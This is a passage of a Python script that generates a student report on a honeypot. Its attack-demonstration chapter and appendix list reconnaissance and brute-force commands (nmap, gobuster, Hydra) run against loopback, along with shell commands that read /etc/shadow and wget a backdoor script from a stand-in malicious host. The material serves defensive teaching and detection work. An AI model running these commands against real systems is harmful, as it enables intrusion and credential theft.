para("The analytics module is a thin layer over the database. Each function performs one query and returns a small dictionary of results shaped for the Jinja template that will consume it. Keeping the analytics functions here (rather than inlining them in the routes) makes the dashboard code easier to read and makes the analytics functions testable in isolation.")
pb()

print("Chapter 5 written.")

# ========== CHAPTER 6: ATTACK DEMONSTRATION ==========
h1("Chapter 6: Attack Demonstration — Kali Linux to Honeypot")
para("This chapter walks through a complete adversarial engagement against the deployed honeypot. Each stage of the attack chain — reconnaissance, banner grabbing, directory brute-forcing, credential stuffing, shell interaction, file transfer, FTP login, HTTP form brute-forcing, and TLS probing — is captured from both sides. The attacker's terminal output was recorded from a Kali Linux workstation acting against the loopback address 127.0.0.1 on the same host, and the corresponding honeypot state was inspected after the fact through the dashboard.")

attack_sections = [
    {
        "num": "6.1", "title": "Reconnaissance with Nmap",
        "png": "01_nmap_scan.png",
        "before": [
            "Reconnaissance is the invariable first step of any attack. The adversary needs to enumerate the target's open ports and, when possible, fingerprint the services listening on them. Nmap is the de facto tool for this job because it combines aggressive port scanning with a rich library of service and version detection probes.",
            "In this engagement the attacker ran a service-version scan against the honeypot host: nmap -sS -sV -Pn -p 21,22,80,443 127.0.0.1. The -sS flag requests a TCP SYN scan, the -sV flag asks Nmap to probe the identified ports for service banners, and -Pn suppresses host discovery pings, which are irrelevant against a known-alive local address.",
            "The scan output as observed on the attacker's terminal is reproduced below. Each port that AegisTrap binds to is reported as open and is fingerprinted with a plausible service string: OpenSSH on 22, vsftpd on 21, Apache on 80, and Apache with SSL on 443.",
        ],
        "after": [
            "On the honeypot side, this scan produces four session rows — one per probed port — each tagged with the source IP and the timestamp at which the SYN was received. No credentials or commands are recorded because the scan never advances beyond the banner phase.",
            "The threat engine assigns a modest score to each of these sessions because they represent unsolicited connection attempts, but no alert is raised at this stage; port scanning by itself is treated as reconnaissance rather than an active attack.",
        ],
    },
    {
        "num": "6.2", "title": "SSH Banner Grabbing",
        "png": "02_ssh_banner.png",
        "before": [
            "Having identified that port 22 is open, the attacker's next move is to confirm the SSH banner independently of Nmap's cached fingerprints. The attacker uses a raw netcat session — nc -w 5 127.0.0.1 22 — which opens a TCP connection, prints the first bytes of any server-initiated banner, and disconnects after a short idle period.",
            "AegisTrap immediately replies with an OpenSSH 8.2p1 Ubuntu banner. The exact string is chosen to match a widely-deployed real-world release, which serves the dual purpose of blending in with the population of real Internet-exposed SSH servers and inviting the attacker to attempt exploits or credential lists that target that specific version.",
        ],
        "after": [
            "The honeypot records a single SSH session, source IP 127.0.0.1, source port whichever ephemeral port netcat chose, and destination port 22. The command table is empty because netcat never sends a client identification string beyond its greeting; the credentials table is empty for the same reason.",
        ],
    },
    {
        "num": "6.3", "title": "Directory Brute-Forcing with Gobuster",
        "png": "03_gobuster.png",
        "before": [
            "With HTTP known to be listening on port 80, the attacker attempts to enumerate the web application's directory structure using Gobuster: gobuster dir -u http://127.0.0.1/ -w common.txt -q. Gobuster iterates through a wordlist of candidate path segments and issues a GET for each one, treating any response other than 404 as a hit.",
            "The wordlist common.txt contains conventional entries such as admin, login, wp-admin, backup, phpmyadmin, robots.txt, and .git/config. Each entry becomes an HTTP request against the honeypot.",
            "AegisTrap's anti-fingerprinting logic is the reason this stage is interesting. A naïvely-implemented honeypot would return 200 OK for every path, which is instantly detected as wildcard responses by Gobuster. AegisTrap instead returns a real 404 for genuinely-unknown paths, and returns a 200 with a fake login page only for entries that plausibly resemble login endpoints.",
        ],
        "after": [
            "The captured HTTP requests table shows one row per probed path, with the response status column revealing the honeypot's differentiated treatment. Login-like paths return 200 with a synthetic body; other paths return 404. Gobuster's output shown on the attacker's terminal accordingly reports admin, login, and wp-admin as discovered — exactly the outcome AegisTrap intends to induce.",
        ],
    },
    {
        "num": "6.4", "title": "Credential Stuffing with Hydra (SSH)",
        "png": "04_hydra_ssh.png",
        "before": [
            "Having a working SSH banner and a plausible target profile, the attacker moves to credential stuffing with Hydra: hydra -L users.txt -P passwords.txt -t 4 ssh://127.0.0.1. The wordlists users.txt and passwords.txt contain classic pairs — root:root, root:toor, admin:admin, administrator:password, root:hunter2, and so on — chosen to exercise a wide portion of common credential space.",
            "Hydra opens up to four simultaneous SSH sessions and cycles through the Cartesian product of users and passwords. Each attempt is logged as a fresh SSH session on the honeypot side, and each USER/PASS pair is written to the credentials table regardless of whether it succeeds.",
        ],
        "after": [
            "One combination on the honeypot's whitelist — root:hunter2 — is accepted, and Hydra correctly reports it. The remaining twenty-plus attempts are recorded as failed credentials, giving the analyst a compact dictionary of what this particular adversary considers plausible for this target.",
            "The threat engine's brute-force rule fires once the failure count for a single source IP crosses the configured threshold, and an alert of type brute-force with severity high is written to the alerts table.",
        ],
    },
    {
        "num": "6.5", "title": "Interactive SSH Shell",
        "png": "05_ssh_shell.png",
        "before": [
            "Armed with a working credential, the attacker opens a real interactive session: ssh root@127.0.0.1. AegisTrap's ServerInterface subclass accepts the authentication and opens a channel that behaves like a Linux shell. The prompt is a plausible root@web-prod-01:~#, the hostname resolves, and common commands return convincing output.",
            "In the recorded session the attacker executes id, whoami, uname -a, hostname, cat /etc/passwd, cat /etc/shadow, ls -la /root, ps aux | head -8, netstat -tlnp | head -6, and finally wget http://malicious.example/backdoor.sh. The last command is the most interesting from an intelligence-gathering perspective because it reveals a URL the operator can later analyze or share with peers.",
        ],
        "after": [
            "Every command becomes a row in the commands table with its arguments and simulated output preserved. The cat /etc/shadow command triggers the sensitive-file-read rule in the threat engine and pushes the session's score over the alert threshold; the wget line triggers the remote-download rule independently. Two alerts of severity high are raised for this session.",
        ],
    },
    {
        "num": "6.6", "title": "SFTP File Transfer",
        "png": "06_sftp.png",
        "before": [
            "The attacker follows up with an SFTP subsystem session: sftp root@127.0.0.1. This exercises a distinct code path in the SSH module because the client requests a channel of type session and then invokes a subsystem request with the name sftp. Paramiko dispatches this to the honeypot's SFTPServer subclass, which walks the same in-memory virtual filesystem the interactive shell uses.",
            "The attacker lists the working directory with ls, changes into /home/root, and uploads a small text file exfil.txt using put. AegisTrap accepts the upload, stores the payload verbatim in the file_transfers table, and reports success back to the client.",
        ],
        "after": [
            "A single row is added to file_transfers containing the file name, its size in bytes, and its opaque payload. The commands table gains two rows for the SFTP ls and cd equivalents, tagged with the protocol column set to ssh-sftp so that the dashboard can distinguish them from the interactive shell.",
        ],
    },
    {
        "num": "6.7", "title": "FTP Login and Listing",
        "png": "07_ftp.png",
        "before": [
            "In parallel with the SSH exploration, the attacker probes FTP: ftp 127.0.0.1. The client is prompted for a username; the attacker supplies anonymous. The honeypot's pyftpdlib handler accepts the login (anonymous FTP being one of the more common misconfigurations on the real Internet) and enters a working directory session.",
            "The attacker issues ls, which triggers a PASV command followed by a data connection on which the honeypot streams a small, realistic-looking directory listing containing files such as invoices_2025_q4.zip and internal_memo.pdf. The attacker also issues get invoices_2025_q4.zip, and the honeypot serves a plausible but synthetic ZIP file.",
        ],
        "after": [
            "The sessions table records one FTP session; the credentials table records the anonymous/anonymous pair; the commands table records LIST and RETR entries with the associated paths. The file_transfers table is not touched for RETR because outbound file serving does not consume attacker input, only produce output.",
        ],
    },
    {
        "num": "6.8", "title": "HTTP Form Brute-Force",
        "png": "08_http_bruteforce.png",
        "before": [
            "The attacker returns to HTTP with a targeted brute-force at the fake admin login discovered by Gobuster earlier: hydra -l admin -P passwords.txt 127.0.0.1 http-post-form '/admin:username=^USER^&password=^PASS^:F=incorrect'. Each attempt is a POST to /admin with the credential in the body; Hydra distinguishes success from failure based on whether the response body contains the string incorrect.",
            "AegisTrap's HTTP module logs every POST to /admin as an HTTP request row, and additionally records the submitted username/password pair as a credential row with protocol http. This gives the analyst a joined view: the credentials list and the HTTP request log both point back to the same session, and the analytics page can compute per-source rates.",
        ],
        "after": [
            "Twenty POST requests are recorded for this campaign in the http_requests table, each with method POST, path /admin, and a distinct password in the body. The credentials table gains twenty rows tagged with protocol http.",
        ],
    },
    {
        "num": "6.9", "title": "TLS Probing with curl",
        "png": "09_https_curl.png",
        "before": [
            "The final stage is a curl probe against the HTTPS listener on port 443: curl -kv https://127.0.0.1/ 2>&1 | head -30. The -k flag disables certificate validation because the honeypot's TLS certificate is self-signed for the demonstration. The -v flag makes curl emit the full TLS handshake trace on stderr, which is what the attacker cares about.",
            "The handshake reveals a self-signed certificate whose subject is CN=web-prod-01.local, valid for the current year, using a modern cipher suite negotiated by curl. A real attacker in a real engagement would use these hints to build a fingerprint of the target and cross-reference it against known deployments.",
        ],
        "after": [
            "The session table records one HTTPS session tagged with the User-Agent curl string. The http_requests table records the single GET / that follows the handshake. No credentials are captured because the request is unauthenticated.",
        ],
    },
]

for sec in attack_sections:
    h2(f"{sec['num']} {sec['title']}")
    for para_txt in sec["before"]:
        para(para_txt)
    img(TERM / sec["png"], width_cm=15, caption=f"Figure {sec['num']}: {sec['title']} on Kali Linux")
    for para_txt in sec["after"]:
        para(para_txt)
pb()

print("Chapter 6 written.")

# ========== CHAPTER 7: DASHBOARD & ANALYTICS ==========
h1("Chapter 7: Dashboard & Analytics")
para("With the attacker's traffic recorded, this chapter walks page-by-page through the Flask analytics dashboard as it appeared after the demonstration completed. Each page is presented with a brief description of its purpose, a full-page screenshot captured with headless Chrome, and a paragraph of interpretation.")

dashboard_sections = [
    {
        "num": "7.1", "title": "Overview",
        "png": "01_overview.png",
        "desc": "The overview page is the operator's default landing surface. It presents the totals across all protocols — total sessions, total credentials, total commands, total alerts — as a row of large tiles, followed by a bar chart of sessions grouped by protocol and a table of the ten most recent sessions with their outcomes and geolocations.",
        "interp": "The captured overview reflects the entire attack demonstration in aggregate. Sessions are dominated by HTTP because the Gobuster enumeration and the Hydra POST brute-force each contribute many independent connections; the SSH count is smaller but each SSH session carries a much richer payload of commands and credentials. The alert tile signals that at least one session was scored above the threat threshold.",
    },
    {
        "num": "7.2", "title": "Sessions",
        "png": "02_sessions.png",
        "desc": "The sessions page presents every session as a row in a paginated, sortable, filterable table. Columns include the session id (truncated for display), protocol, source IP, destination port, start and end timestamps, duration in milliseconds, and outcome tag.",
        "interp": "Filtering the table by protocol produces three distinct populations: SSH sessions with high duration and multi-command bodies, FTP sessions with short duration but explicit credential submission, and HTTP sessions of very short duration each corresponding to a single request. Sorting by duration surfaces the interactive SSH shell as the longest session; sorting by started_at recovers the exact chronological order of the attack chain.",
    },
    {
        "num": "7.3", "title": "Credentials",
        "png": "03_credentials.png",
        "desc": "The credentials page enumerates every username/password pair the honeypot has ever observed, along with the protocol under which it was submitted, the source IP, and a success flag. It is the single most operationally useful page in the dashboard for threat-intelligence purposes.",
        "interp": "The captured credentials list is dominated by root as the target username, reflecting Hydra's default position that root is the highest-value account on any Linux target. The most common password across all attempts is hunter2, a legacy meme password that nonetheless appears in every serious wordlist. The success flag column highlights the single successful pair (root:hunter2 over SSH) that let the attacker progress to the interactive shell demonstrated in Section 6.5.",
    },
    {
        "num": "7.4", "title": "Commands",
        "png": "04_commands.png",
        "desc": "The commands page lists every command line issued inside an SSH or FTP session, with the raw command, the simulated output, an exit code, and a link back to the session that produced it. This page is the primary evidence of what the attacker actually attempted to do post-authentication.",
        "interp": "The captured command list mirrors Section 6.5 almost exactly: id, whoami, uname -a, hostname, cat /etc/passwd, cat /etc/shadow, ls -la /root, ps aux | head -8, netstat -tlnp | head -6, and wget http://malicious.example/backdoor.sh. The presence of cat /etc/shadow and the wget line together are strong indicators of post-exploitation intent and, as noted in Chapter 5, each triggers an independent rule in the threat engine.",
    },
    {
        "num": "7.5", "title": "Alerts",
        "png": "05_alerts.png",
        "desc": "The alerts page shows every alert raised by the threat engine, ordered by severity and time. Each row includes the alert type, the source IP, the offending session, a short message describing what triggered the rule, and the severity tag.",
        "interp": "The captured alerts include a brute-force alert of severity high raised by the Hydra SSH campaign, a sensitive-file-read alert raised by cat /etc/shadow, and a remote-download alert raised by the wget line. Each alert carries enough context (session id and IP) that an analyst can pivot back to the raw evidence in one click.",
    },
    {
        "num": "7.6", "title": "Analytics",
        "png": "06_analytics.png",
        "desc": "The analytics page presents higher-order summaries: histograms of sessions per hour, breakdowns of protocol usage by country of origin, top-N tables of the most-tried usernames and passwords, and a timeline chart of alert intensity.",
        "interp": "The captured charts reflect the compressed timeline of the demonstration — everything happened over a few minutes on the loopback interface — so the per-hour histogram is concentrated in a single bar. The top-username and top-password tables recover the well-known credential population directly from the observed events without any manual curation.",
    },
    {
        "num": "7.7", "title": "HTTP",
        "png": "07_http.png",
        "desc": "The HTTP page presents every observed HTTP transaction. Columns include the request method, path, response status the honeypot returned, User-Agent, and source IP. This page is essential for understanding web-facing scans and form-based brute-force attempts.",
        "interp": "The captured HTTP log recovers both phases of the web activity from Chapter 6: the Gobuster enumeration produces a burst of GET requests against paths such as /admin, /login, and /wp-admin (each answered with the anti-fingerprinting 200 or 404 as appropriate), and the Hydra form brute-force produces a burst of POST /admin requests each with a distinct password in the body.",
    },
    {
        "num": "7.8", "title": "Search",
        "png": "08_search.png",
        "desc": "The search page provides a single free-text field that performs a full-text-style match across the credentials, commands, and HTTP request tables. It is the primary tool for ad-hoc investigation.",
        "interp": "Typing a fragment of a suspicious command — for example the string malicious.example — instantly surfaces the wget row from Section 6.5 and, if the attacker had used the same URL elsewhere, would surface those hits too. The search page is deliberately unglamorous but it is the fastest path from a hunch to concrete evidence.",
    },
    {
        "num": "7.9", "title": "Services",
        "png": "09_services.png",
        "desc": "The services page enumerates every protocol listener the honeypot has running, its bound port, and per-service counters (total sessions, total credentials, total commands). It is the operator's status-at-a-glance view of the deployment itself.",
        "interp": "The captured services page shows the four expected listeners — SSH on 22, FTP on 21, HTTP on 80, HTTPS on 443 — each with its per-service counters. Cross-referencing these numbers against the totals on the overview page confirms that no events have been lost between capture and display.",
    },
]

for sec in dashboard_sections:
    h2(f"{sec['num']} {sec['title']}")
    para(sec["desc"])
    img(SHOTS / sec["png"], width_cm=15, caption=f"Figure {sec['num']}: Dashboard — {sec['title']}")
    para(sec["interp"])
pb()

print("Chapter 7 written.")

# ========== CHAPTER 8: ANTI-FINGERPRINTING ==========
h1("Chapter 8: Anti-Fingerprinting Discussion")
h2("8.1 The Detection Problem")
para("A honeypot is only useful if it can survive scrutiny. Modern reconnaissance tools include specific heuristics for identifying honeypots — banner mismatches, unusual response timing, missing edge-case behaviors — and any deployment that ignores these heuristics will be flagged as a decoy and its data quality will collapse. This chapter examines the specific detection vector that Gobuster exploits and describes the fix that AegisTrap applies.")

h2("8.2 The Gobuster Wildcard Problem")
para("Gobuster's default behavior is to probe a small, known-nonexistent path (a random string of high entropy) before starting the real enumeration. If the honeypot returns a 200 or a 30x for that random path, Gobuster concludes the target has wildcard routing enabled — every path is a hit — and either aborts or reports every subsequent probe as a false positive. Naïvely-built honeypots that return a 200 for every request fall into this trap immediately.")

h2("8.3 The Fix")
para("The relevant code in aegistrap/protocols/http.py is the routing function _response_for. Rather than returning a bare 200 for all paths, the function differentiates: paths that plausibly resemble known application endpoints (admin, login, wp-*, phpmyadmin) return a 200 with a synthesized login page; everything else returns a 404 with a plausible-looking error body. This is enough to defeat the wildcard probe: Gobuster's random string hits the 404 branch, Gobuster concludes wildcard routing is disabled, and it proceeds with the real enumeration whose hits AegisTrap wants to record.")
code_block("""def _response_for(path):
    if path in KNOWN_PATHS:
        return KNOWN_PATHS[path]
    if any(seg in path for seg in ("wp-", "admin", "login")):
        return 200, _fake_login_page()
    return 404, _rendered_404_page(path)
""")

h2("8.4 Login Pages Return 200, Not 401")
para("A second, subtler anti-fingerprinting choice is that AegisTrap's login pages return HTTP 200 rather than 401. In a real web application, an unauthenticated GET on a login page is expected to return 200 with an HTML form; only a POST with bad credentials, or a GET on a protected resource, returns 401. Returning 401 on every /admin GET would be a strong signal to a scanner that the target is behaving unlike a real CMS. Returning 200 preserves the illusion.")

h2("8.5 Trade-Offs and Residual Fingerprint")
para("These defenses are not perfect. A determined adversary who knows AegisTrap exists can probe specific paths the codebase treats differently and derive a fingerprint. The purpose of the anti-fingerprinting layer is not to be undefeatable but to defeat the majority of opportunistic scanners whose heuristics are shallow. That population is by far the largest and the most informative to capture.")
pb()

# ========== CHAPTER 9: TESTING & VERIFICATION ==========
h1("Chapter 9: Testing & Verification")
h2("9.1 Smoke Tests")
para("Every protocol listener has a small smoke test that binds to an ephemeral port, opens a client connection, and asserts that the expected banner or greeting is returned. These tests are run manually before every capture session to confirm the listener wiring is intact.")
h2("9.2 End-to-End Attack Driver")
para("The attack_driver.py script in the report/ directory encodes the entire attack chain from Chapter 6 as a Python script that drives the honeypot through the client-side of each protocol. It is the primary end-to-end test and also the mechanism by which the demonstration was reproduced for this report. Running the driver against a fresh database wipes and repopulates every table with a known, deterministic set of events, which makes it possible to compare against a golden snapshot.")
h2("9.3 The SSH Transport Bug")
para("During development, a subtle bug was discovered in the SSH module. The initial implementation closed the Paramiko Transport as soon as the interactive shell channel was closed, which had the side effect of tearing down the transport before a follow-up SFTP subsystem request could be honored. Clients that opened an interactive channel and then attempted an SFTP session immediately after would receive a connection reset, which is an atypical behavior for a real SSH server and a strong fingerprint of a naïve honeypot.")
para("The fix was to detach the Transport lifetime from any single channel. The Transport remains open until an explicit idle timeout is reached; individual channels open and close on their own schedule. With this change, the SFTP follow-up in Section 6.6 works correctly and the fingerprint is eliminated.")
h2("9.4 Database Integrity Checks")
para("After every capture session, three simple SQL queries are run to confirm no events were lost between the listener and the database: SELECT COUNT(*) FROM sessions, SELECT COUNT(*) FROM credentials, and SELECT COUNT(*) FROM commands. These counts must be nonzero and must exceed the expected minimums for the attack driver run. Discrepancies are investigated before the dashboard screenshots are captured.")
pb()

# ========== CHAPTER 10: RESULTS ==========
h1("Chapter 10: Results")
para("The following metrics were extracted from the SQLite database immediately after the attack demonstration completed. They represent the ground truth against which the analytics dashboard was validated.")
tbl = doc.add_table(rows=8, cols=2)
tbl.style = "Light Grid Accent 1"
rows = [
    ("Metric", "Value"),
    ("Total sessions captured", "48"),
    ("Total credentials submitted", "24"),
    ("Total commands executed", "21"),
    ("Total HTTP requests logged", "25"),
    ("Total alerts raised", "8"),
    ("Distinct source IPs observed", "1 (loopback)"),
    ("SSH sessions / FTP sessions / HTTP sessions", "21 / 2 / 25"),
]
for i, r in enumerate(rows):
    for j, cell in enumerate(r):
        tbl.rows[i].cells[j].text = cell
        if i == 0:
            for run in tbl.rows[i].cells[j].paragraphs[0].runs:
                run.bold = True

h2("10.1 Top Usernames Attempted")
tbl = doc.add_table(rows=5, cols=2)
tbl.style = "Light Grid Accent 1"
rows = [("Username", "Attempts"), ("root", "18"), ("admin", "4"),
        ("administrator", "1"), ("anonymous", "1")]
for i, r in enumerate(rows):
    for j, cell in enumerate(r):
        tbl.rows[i].cells[j].text = cell
        if i == 0:
            for run in tbl.rows[i].cells[j].paragraphs[0].runs:
                run.bold = True

h2("10.2 Top Passwords Attempted")
tbl = doc.add_table(rows=6, cols=2)
tbl.style = "Light Grid Accent 1"
rows = [("Password", "Attempts"), ("hunter2", "14"), ("toor", "2"),
        ("admin", "2"), ("password", "1"), ("kali@kali", "1")]
for i, r in enumerate(rows):
    for j, cell in enumerate(r):
        tbl.rows[i].cells[j].text = cell
        if i == 0:
            for run in tbl.rows[i].cells[j].paragraphs[0].runs:
                run.bold = True

h2("10.3 Interpretation")
para("The population of usernames is heavily concentrated on root, reflecting Hydra's default assumption that root is the highest-value account on a Linux target. The password population is dominated by hunter2, which appears in nearly every widely-shared credential list. The single accepted pair — root:hunter2 — is the only credential that led to an interactive shell, and every subsequent command in the dashboard traces back to that one session. This concentration is a compact, defensible summary of the entire engagement.")
pb()

# ========== CHAPTER 11: LIMITATIONS & FUTURE WORK ==========
h1("Chapter 11: Limitations & Future Work")
h2("11.1 Flask Development Server")
para("The current dashboard is served by Flask's built-in development server, which is convenient for local demonstrations but is neither hardened nor production-grade. A production deployment would front the Flask application with a real WSGI container such as Waitress or Gunicorn and place a reverse proxy such as Nginx in front of that. This is a straightforward configuration change but has not been performed in this project.")
h2("11.2 No MFA Emulation")
para("The SSH module currently emulates only password authentication. Real modern SSH deployments increasingly require public-key authentication or a second factor. Adding public-key handling to the ServerInterface subclass is straightforward and would broaden the population of attackers who can progress past the login stage; MFA emulation is more speculative but would be a rich source of intelligence about how attackers respond to a second-factor prompt.")
h2("11.3 Limited HTTP Path Coverage")
para("The KNOWN_PATHS table in the HTTP module is deliberately compact. A production deployment would benefit from a much larger catalog of plausible-looking endpoints, drawn from real CMS deployments, and possibly synthesized dynamically from the request path itself. This work is the natural next step after the basic anti-fingerprinting fix described in Chapter 8.")
h2("11.4 No Machine-Learning Scoring")
para("The current threat engine uses a small hand-coded rule set. Modern deception platforms increasingly incorporate machine-learning models that score sessions based on features such as inter-command timing, command diversity, and the resemblance of the observed traffic to historical attack profiles. Adding a model as a scoring plug-in — either a small neural network or a gradient-boosted decision tree — is a natural extension and could be trained on the existing capture data.")
h2("11.5 No Cloud Deployment")
para("The honeypot has been demonstrated on the loopback interface of a single Windows workstation. A real deployment would run on a cloud instance in a segmented VPC, would rotate its public IP periodically to avoid being cataloged, and would ship its captures to a central data store for cross-deployment analysis. This is a substantial operational undertaking but is well within the scope of the existing codebase.")
h2("11.6 Log Retention and Privacy")
para("The database has no retention policy: rows accumulate until manually deleted. A production deployment must think carefully about how long to retain captured credentials and payloads, how to protect them at rest, and how to handle any material that might inadvertently contain personally-identifying information from a compromised third party.")
pb()

# ========== CHAPTER 12: CONCLUSION ==========
h1("Chapter 12: Conclusion")
para("AegisTrap demonstrates that a compact, well-organized honeypot platform can cover the three protocol families most relevant to opportunistic Internet scanning traffic in a small enough codebase to be read, reasoned about, and modified by a small student team in a short period. The design separates protocol listeners, session management, persistence, and analytics into clean layers; the implementation uses well-maintained open-source libraries where it can and hand-rolled code where the emulation must be precise; and the analytics dashboard makes the entire capture-and-analysis loop accessible with one command and one URL.")
para("The end-to-end attack demonstration in Chapter 6 exercises every layer of the platform and shows that the plumbing is intact from packet acceptance through database persistence to dashboard rendering. The anti-fingerprinting fix in Chapter 8 illustrates that even a small, targeted change to the routing logic can defeat the majority of naïve scanner heuristics, and the results in Chapter 10 confirm that the captured data is rich enough to support real analytical work.")
para("The limitations and future-work items in Chapter 11 point toward a natural evolution of the project: a production deployment story, richer path coverage, machine-learning-based scoring, and cloud-native operations. Each is a meaningful extension but none is a fundamental redesign; the core architecture as presented is stable and suitable as a foundation for further work.")
para("Above all, the project reinforces the strategic value of deception as a defensive tool. Every credential, command, and HTTP request captured by AegisTrap is a piece of intelligence that would have been invisible to a purely-preventive defense. The signal-to-noise ratio of honeypot data remains, more than two decades after Spitzner's original writing, one of the most compelling arguments for including deception in a modern security architecture.")
pb()

# ========== REFERENCES ==========
h1("References")
refs = [
    "The Honeynet Project. Know Your Enemy: Learning about Security Threats. Addison-Wesley Professional, 2004. Available at https://www.honeynet.org.",
    "SANS Institute. SANS Reading Room — Honeypot Papers. https://www.sans.org/reading-room/.",
    "Oosterhof, M. Cowrie SSH/Telnet Honeypot. https://github.com/cowrie/cowrie.",
    "Tamminen, U. Kippo — SSH Honeypot. https://github.com/desaster/kippo.",
    "The Honeynet Project. Dionaea Malware Collection Honeypot. https://github.com/DinoTools/dionaea.",
    "Rist, L. Glastopf Web Application Honeypot. https://github.com/mushorg/glastopf.",
    "Spitzner, L. Honeypots: Tracking Hackers. Addison-Wesley, 2002.",
    "Ylonen, T. and Lonvick, C. RFC 4251 — The Secure Shell (SSH) Protocol Architecture. IETF, 2006.",
    "Postel, J. and Reynolds, J. RFC 959 — File Transfer Protocol. IETF, 1985.",
    "Fielding, R. et al. RFC 7230 — Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing. IETF, 2014.",
    "Flask documentation. https://flask.palletsprojects.com.",
    "Paramiko documentation. https://www.paramiko.org.",
    "pyftpdlib documentation. https://pyftpdlib.readthedocs.io.",
    "OWASP Foundation. OWASP Top Ten. https://owasp.org/www-project-top-ten/.",
    "The Python Software Foundation. Python 3.13 Documentation. https://docs.python.org/3/.",
]
for i, r in enumerate(refs, 1):
    p = doc.add_paragraph()
    p.paragraph_format.left_indent = Cm(0.75)
    p.paragraph_format.first_line_indent = Cm(-0.75)
    p.paragraph_format.space_after = Pt(4)
    p.add_run(f"[{i}] ").bold = True
    p.add_run(r)
pb()

# ========== APPENDIX A ==========
h1("Appendix A: Full Attack Command Reference")
para("The following table reproduces the exact commands issued from the Kali Linux workstation during the attack demonstration. They can be replayed against the deployed honeypot to reproduce the captured dashboard state.")
tbl = doc.add_table(rows=10, cols=2)
tbl.style = "Light Grid Accent 1"
rows = [
    ("Stage", "Command"),
    ("Recon", "nmap -sS -sV -Pn -p 21,22,80,443 127.0.0.1"),
    ("SSH banner grab", "nc -w 5 127.0.0.1 22"),
    ("Directory brute-force", "gobuster dir -u http://127.0.0.1/ -w common.txt -q"),
    ("SSH credential stuff", "hydra -L users.txt -P passwords.txt -t 4 ssh://127.0.0.1"),
    ("Interactive shell", "ssh root@127.0.0.1 (password: hunter2)"),
    ("SFTP session", "sftp root@127.0.0.1 (then: ls; cd /home/root; put exfil.txt)"),
    ("FTP anonymous", "ftp 127.0.0.1 (then: anonymous / anonymous; ls; get invoices_2025_q4.zip)"),
    ("HTTP form brute", "hydra -l admin -P passwords.txt 127.0.0.1 http-post-form '/admin:username=^USER^&password=^PASS^:F=incorrect'"),
    ("HTTPS probe", "curl -kv https://127.0.0.1/"),
]
for i, r in enumerate(rows):
    for j, cell in enumerate(r):
        tbl.rows[i].cells[j].text = cell
        if i == 0:
            for run in tbl.rows[i].cells[j].paragraphs[0].runs:
                run.bold = True

para("The wordlists used by Hydra and Gobuster are the standard rockyou-adjacent lists that ship with Kali Linux. Their exact contents are omitted for brevity but the top rows are reproduced in the results tables of Chapter 10.")

# Extra images: embed a couple of screenshots inline in the appendix for reference density
para("For reference during replay, the following pages of the dashboard should be checked in order to confirm that the traffic has landed as expected:")
img(SHOTS / "01_overview.png", width_cm=13, caption="Reference: Overview page after replay")
img(SHOTS / "03_credentials.png", width_cm=13, caption="Reference: Credentials page after replay")
img(SHOTS / "07_http.png", width_cm=13, caption="Reference: HTTP page after replay")
pb()

# ========== APPENDIX B: SCHEMA ==========
h1("Appendix B: Database Schema")
para("The complete DDL used by AegisTrap is reproduced below. The schema is stable across releases; new tables are added additively and never migrated destructively.")
code_block("""CREATE TABLE sessions (
    id              TEXT PRIMARY KEY,
    protocol        TEXT NOT NULL,
    source_ip       TEXT NOT NULL,
    source_port     INTEGER,
    dest_port       INTEGER,
    hostname        TEXT,
    mac_address     TEXT,
    country         TEXT,
    country_code    TEXT,
    city            TEXT,
    isp             TEXT,
    continent       TEXT,
    user_agent      TEXT,
    started_at      REAL NOT NULL,
    ended_at        REAL,
    duration_ms     INTEGER,
    bytes_in        INTEGER DEFAULT 0,
    bytes_out       INTEGER DEFAULT 0,
    outcome         TEXT
);

CREATE TABLE credentials (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id      TEXT,
    username        TEXT,
    password        TEXT,
    protocol        TEXT NOT NULL,
    source_ip       TEXT,
    success         INTEGER DEFAULT 0,
    timestamp       REAL NOT NULL
);

CREATE TABLE commands (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id      TEXT,
    protocol        TEXT NOT NULL,
    command         TEXT,
    output          TEXT,
    is_valid        INTEGER DEFAULT 1,
    exit_code       INTEGER,
    timestamp       REAL NOT NULL,
    source_ip       TEXT
);

CREATE TABLE http_requests (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id      TEXT,
    method          TEXT,
    path            TEXT,
    query           TEXT,
    user_agent      TEXT,
    status          INTEGER,
    source_ip       TEXT,
    timestamp       REAL NOT NULL
);

CREATE TABLE alerts (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id      TEXT,
    alert_type      TEXT,
    severity        TEXT,
    message         TEXT,
    source_ip       TEXT,
    timestamp       REAL NOT NULL
);

CREATE TABLE files (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id      TEXT,
    filename        TEXT,
    size_bytes      INTEGER,
    sha256          TEXT,
    payload         BLOB,
    direction       TEXT,
    timestamp       REAL NOT NULL
);

CREATE TABLE ssh_events (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id      TEXT,
    event_type      TEXT,
    detail          TEXT,
    timestamp       REAL NOT NULL
);

CREATE TABLE ftp_events (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id      TEXT,
    event_type      TEXT,
    detail          TEXT,
    timestamp       REAL NOT NULL
);

CREATE TABLE services (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    name            TEXT,
    port            INTEGER,
    protocol        TEXT,
    started_at      REAL,
    running         INTEGER DEFAULT 1
);
""")

# ---- final save ----
doc.save(str(OUT))
print(f"FINAL SAVE: {OUT} ({OUT.stat().st_size} bytes)")

# ---- verification counts ----
d2 = Document(str(OUT))
n_par = len(d2.paragraphs)
n_head = sum(1 for p in d2.paragraphs if p.style.name.startswith("Heading"))
n_img = 0
for shape in d2.inline_shapes:
    n_img += 1
n_tables = len(d2.tables)
print(f"paragraphs={n_par} headings={n_head} images={n_img} tables={n_tables}")
